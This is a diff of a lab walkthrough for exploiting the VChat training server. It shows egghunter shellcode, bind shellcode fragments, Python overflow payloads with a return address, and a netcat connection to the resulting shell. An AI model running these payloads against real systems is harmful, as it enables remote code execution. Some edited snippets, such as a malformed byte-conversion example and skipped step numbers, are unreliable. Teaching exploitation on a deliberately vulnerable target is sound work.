@@ -224,6 +224,8 @@ I do feel it is a bit hard to identify which string actually crashes VChat. It a
 
    4. Once the overflow occurs, click the *step over* button.
 
+		<img src="Images/afterJmpEsp.png" width=600>
+
    5. Notice that we jumped to the stack we just overflowed!
 
 
@@ -235,39 +237,31 @@ Now that we have all the necessary parts for the creation of an exploit we will 
 > Addresses and offsets may vary!
 
 #### Unconditional Jump
-As we noted in the previous section, there are **only** *24* bytes of free space after the `jmp esp` instruction is executed. We *cannot* create shellcode that allows remote execution in that limited amount of space. However, we can place instructions in that small segment of memory that will enable us to use the *144* bytes of space allocated to the buffer we overflowed in order to overwrite the return address.
+As we noted in the previous section, there are **only** *32* bytes of free space after the `jmp esp` instruction is executed. We *cannot* create shellcode that allows remote execution in that limited amount of space. However, we can place instructions in that small segment of memory that will enable us to use the *144* bytes of space allocated to the buffer we overflowed in order to overwrite the return address.
 
 1. We can use the [jump instruction](https://c9x.me/x86/html/file_module_x86_id_147.html) to perform an unconditional jump to an offset relative to the current JUMP instruction's address. The use of a relative offset for the jump is important as we are working within the stack, where addresses may change between calls during it's execution and between the times the process is executed.
-2. Perform the exploitation of VChat with [exploit3.py](./SourceCode/exploit3.py) as described in step `8` from the previous section.
-3. Scroll up to the start of the buffer we overflowed, we can find this by looking for where the `A`'s start as they have the relatively distinct value of 41 as shown before. In this case the address of our buffer start at `00EBF965` or `00FCF965`.
 
-	<img src="Images/I21.png" width=600>
+2. Perform the exploitation of VChat with [exploit3.py](./SourceCode/exploit3.py) as described in step `8` from the previous section.
+
+3. Scroll up to the start of the buffer we overflowed, we can find this by looking for where the `A`'s start, 00BCF921 in this example.
 
 4. We now want to overwrite the start of the `C` buffer with a `jmp` instruction to continue execution by jumping to the start of our buffer. Right-click the location and click assemble as shown below.
 
-	<img src="Images/I22.png" width=600>
+	<img src="Images/jmpBufferStart.png" width=600>
 
 5. Now enter the instruction `jmp 00EBF965` where `00EBF965` may be replaced with your own stack address.
 
-	<img src="Images/I23.png" width=600>
-
 6. Now we can see the newly assembled instruction and step into it to verify that it works!
 
-	<img src="Images/I24.png" width=600>
+7. Using the resulting assembly, modify your exploit code to reflect the [exploit4.py](./SourceCode/exploit4.py) script. To get the resulting machine code right click the `jmp` instruction and select binary copy.
+    * You then need to convert the hex digits into what python expects. For example, `E9 66 FF FF FF` becomes `\xe9\x70\xffxff\xff`.
 
-7. Using the resulting assembly, modify your exploit code to reflect the [exploit4.py](./SourceCode/exploit4.py) script. To get the resulting machine code right click the `jmp` instruction and select binary copy as shown below.
-
-	<img src="Images/I25.png" width=600>
-
-    * You then need to convert the hex digits into what python expects. For example, `E9 66 FF FF FF` becomes `\xe9\x66\xffxff\xff`.
-
-8. Run the [exploit4.py](./SourceCode/exploit4.py) with the breakpoint set at `jmp esp` as was described in  step `8` from the PreExploitation (previous) section. Follow the flow of execution using the *step into* button and make sure we jump to the start of the buffer as expected. That is, after hitting the `jmp esp` breakpoint and clicking the *step into* button *once* you should see the short unconditional `jmp` instruction as shown below. Once you step into the new `jmp` instruction, we should see the start of the buffer.
-
-	<img src="Images/I26.png" width=600>
+8. Run the [exploit4.py](./SourceCode/exploit4.py) with the breakpoint set at `jmp esp`. Follow the flow of execution using the *step into* button and make sure we jump to the start of 'A's as expected. That is, after hitting the `jmp esp` breakpoint and clicking the *step over* button *once* you should see the short unconditional `jmp` instruction as shown below. Once you step over the new `jmp` instruction, we should see the start of the buffer.
 
 #### EggHunter Shellcode Generation
 Now that we can jump to the start of the buffer, we can make the *EggHunter* Shellcode that will be executed on our system to locate the *egg* our reverse shell.
 
+<details>
 > [!NOTE]
 > If you follow older walkthroughs or use this on newer Windows systems, you may face issues due to changes in the systemcall interface as on Windows, which is quite [unstable](https://j00ru.vexillium.org/syscalls/nt/64/).
 >
@@ -282,16 +276,23 @@ Now that we can jump to the start of the buffer, we can make the *EggHunter* She
 >*  `-a x86`: Specifies a x86 target architecture.
 >*  `-f python`: format output for a python script.
 >*  `-e w00t`: Egg to search for.
-   
+</details>
+
 We can use Immunity Debugger and ```mona.py``` to generate egg hunter shellcode that works.
 1. Open Immunity Debugger and use the command `!mona egg -t w00t -wow64 -winver 10`.
     * `!mona`: Use the mona tool.
     * `egg`: Use the EggHunter generation option.
     * `-wow64`: Generate for a 64 bit machine.
     * `-winver 10`: Generate for a Windows 10 machine. Currently, it does not recognize Windows 11 as a valid version.
-2. Copy the output shown below to [exploit5.py](./SourceCode/exploit5.py), this can be found in the file `egghunter.txt` file in the folder `C:\Users\<User>\AppData\Local\VirtualStore\Program Files (x86)\Immunity Inc\Immunity Debugger`, where `<User>` is replaced by your username.
+2. Copy the output to [exploit5.py](./SourceCode/exploit5.py), this can be found in the file `egghunter.txt` file in the folder `C:\Users\<User>\AppData\Local\VirtualStore\Program Files (x86)\Immunity Inc\Immunity Debugger`, where `<User>` is replaced by your username.
 
-	<img src="Images/I28.png" width=600>
+```
+# Generated in with mona.py in Immunity Debugger: !mona egg -t w00t -wow64 -winver 10
+EGGHUNTER =  b"\x33\xd2\x66\x81\xca\xff\x0f\x33\xdb\x42\x53\x53\x52\x53\x53\x53"
+EGGHUNTER += b"\x6a\x29\x58\xb3\xc0\x64\xff\x13\x83\xc4\x0c\x5a\x83\xc4\x08\x3c"
+EGGHUNTER += b"\x05\x74\xdf\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xda\xaf\x75\xd7"
+EGGHUNTER += b"\xff\xe7"
+```
 
 > [!IMPORTANT]
 >  The location of the *egghunter.txt* file may change from system to system! You can also use the command `!mona config -set workingfolder C:\logs\E2` to set the folder our output will be saved to.
@@ -350,45 +351,28 @@ Up until this point in time,  we have been performing [Denial of Service](https:
 	SHELL += b"\x01\x36\xc7\x91\xfa\xcd\xd7\xd0\xff\x8a\x5f\x09"
 	SHELL += b"\x72\x82\x35\x2d\x21\xa3\x1f"
 	```
-3. Generate shellcode packet (Python). Due to the structure of the VChat server and how it handles connections, our packet containing the *bind* shellcode is a bit more complicated.
-   * In some walkthroughs, they do not perform any additional overflows. This is because the original Vulnserver contains memory leaks of sufficient size, where the received data is allocated on the heap and **is not** de-allocated with a `free()` call.
-   * In VChat, the sufficiently sized heap allocations are de-allocated. Therefore, we need to perform an overflow in the **GTER** buffer, which can hold the shellcode and prevent the thread handling the **GTER** message from exiting and de-allocating our shellcode.
-   * We will perform an overflow as is done in the [TURN exploitation](https://github.com/DaintyJet/VChat_TURN); however, we will add two `JMP` instructions and a [NOP Sled](https://unprotect.it/technique/nop-sled/). The NOP Sled allows us to jump to an arbitrary location in the buffer and fall down into the `JMP` instruction placed before the return address, allowing us to easily create an infinite loop that prevents de-allocation.
-   * We can pick an arbitrary location in the buffer to jump to and assemble the instruction as done in `step 1` of the exploitation procedure.
-	```py
-	PAYLOAD_SHELL = (
-    	b'GTER /.:/' +                        # GTER command of the server
-    	SHELL +                               # Shell code
-    	b'\x90' * (2003 - (len(SHELL) + 5)) + # Padding! We have the shellcode and 5 bytes of the jump we account for
+3. Generate shellcode packet (Python).
 
-    	# 62501205   FFE4             JMP ESP
-    	# Return a bytes object.
-    	# Format string '<L': < means little-endian; L means unsigned long
-    	b'\xe9\x30\xff\xff\xff' +      # Jump back into NOP sled so we create an infinite loop
-    	struct.pack('<L', 0x6250151e)+ # Override Return address, So we can execute on the stack
-    	b'\xe9\x30\xff\xff\xff'        # Jump into NOP sled
-	)
-	```
-     * `b'GTER /.:/'`: We are targeting the **GTER** buffer as this has the space we need for the tcp-bind shellcode and the infinite-loop code.
-     * `SHELL`: The Shellcode is placed in the buffer. This can be done anywhere, but placing it at the front allows us to avoid accidentally jumping into it.
-     * `b'\x90' * (2003 - (len(SHELL) + 5))`: Create a NOP Sled; we do not want to overshoot the return address, so we need to account for the length of the shellcode, and the 5-byte instruction for the `JMP` we will perform.
-     * `b'\xe9\x30\xff\xff\xff'`: This is one of the two `JMP` instructions, this is placed before the return address to prevent us from executing the address as an instruction which may lead to a crashed system state.
-     * `struct.pack('<L', 0x6250151e)`: A `JMP ESP` address, this is one of the ones we had discovered with the mona.py command `!mona jmp -r esp -cp nonull -o` in Immunity Debugger.
-     * `b'\xe9\x30\xff\xff\xff'`: This is one of the two `JMP` instructions, this is placed after the return address so once we take control of the thread when the `JMP ESP` instruction is executed we enter an infinite loop, which prevents us from exiting the function and de-allocating the shellcode we injected for the EggHunter to find.
+```
+PAYLOAD_SHELL = (
+    b'TRUN /.:/' +                      # TRUN command of the server
+    SHELL                               # Shell code
+)
+```
 
-4. Generate the EggHunter packet (Python).
+6. Generate the EggHunter packet (Python).
 	```py
-	PAYLOAD = (
-		b'GTER /.:/' +
-		EGGHUNTER +
-		b'A' * (143 - len(EGGHUNTER)) +
-		# 0x625014dd | FFE4 | jmp esp
-		struct.pack('<L', 0x625014dd) +
-		# JMP to the start of our buffer
-		b'\xe9\x66\xff\xff\xff' +
-		# This padding is not strictly needed
-		b'C' * (400 - 147 - 4 - 5)
-	)
+PAYLOAD = (
+    b'GTER /.:/' +
+    b'\x90' * 10 +
+    EGGHUNTER +
+    b'\x90' * (135 - len(EGGHUNTER) - 10) + # We move the padding and make it NOP so our jump does not need to be precise.
+    # jmp esp
+    struct.pack('<L', 0x625026D3) +
+    # JMP to the start of our buffer
+    b'\xe9\x70\xff\xff\xff' +
+    b'C' * (400 - 135 - 4 - 5)
+)
 	```
       * `b'GTER /.:/'`: We are overflowing the buffer of the **GTER** command.
       * `EGGHUNTER`: Remember that there is not enough space after the return address for the EggHunter shellcode. So we need to place it at the beginning of the buffer (after the command instruction!).
@@ -402,21 +386,8 @@ Up until this point in time,  we have been performing [Denial of Service](https:
 > ![alt text](Images/Crash-image.png)
 
 #### Debugger Verification and Final Exploitation
-1. You now need to set up Immunity Debugger so it allows exceptions to occur.
-   1. Open Immunity Debugger.
-   2. Click Options, and then *Debug Options* as displayed below.
 
-		<img src="Images/I29.png" width=600>
-
-   3. Access the Exceptions Tab, if nothing is showing click any other tab first, then select the Exceptions tab.
-
-		<img src="Images/I30.png" width=600>
-
-   4. Check All options as shown below (and above!).
-
-		<img src="Images/I30.png" width=600>
-
-2. Organize your exploit code as shown in [exploit5.py](./SourceCode/exploit5.py). Here, the discussion will mainly focus on the order in which we send the payloads.
+1. Organize your exploit code as shown in [exploit5.py](./SourceCode/exploit5.py). Here, the discussion will mainly focus on the order in which we send the payloads.
 	```py
 	with socket.create_connection((HOST, PORT)) as fd:
 		print("Connected...")
@@ -436,14 +407,14 @@ Up until this point in time,  we have been performing [Denial of Service](https:
 	```
       * First we send the bind shellcode packet, this is so the "egg" is staged in memory for the EggHunter to find.
       * Next we send the EggHunter payload, once this is sent the EggHunter should start scanning the memory of our VChat process. Give this a few minuets and we should be able to connect to port 4444 on the target machine for a shell.
-3. Modify your exploit program to reflect the [exploit5.py](./SourceCode/exploit5.py) script and run it. You should see the following output.
+3. Modify your exploit program&mdash;[exploit5.py](./SourceCode/exploit5.py)&mdash;and run it. You should see the following output.
 
 	<img src="Images/I31.png" width=600>
 
    * If you do not see this, the exploit may have failed. Restart VChat and try again!
    * This can be done against the VChat server attached to Immunity Debugger or against it as a standalone program. Due to resource limitations, we tended to run it detached from the Immunity Debugger.
 
-4.  After a few minutes, we can use the command ```nc <IP> <Port>``` where the `<IP` is the Window machine's IP and `Port` is 4444 (Or whatever you generated the bind shellcode to have). This should connect to the server and acquire a shell as shown below.
+4.  We can use the command ```nc <IP> <Port>``` where the `<IP` is the Window machine's IP and `Port` is 4444 (Or whatever you generated the bind shellcode to have). This should connect to the server and acquire a shell as shown below.
 
 	<img src="Images/I32.png" width=600>
 
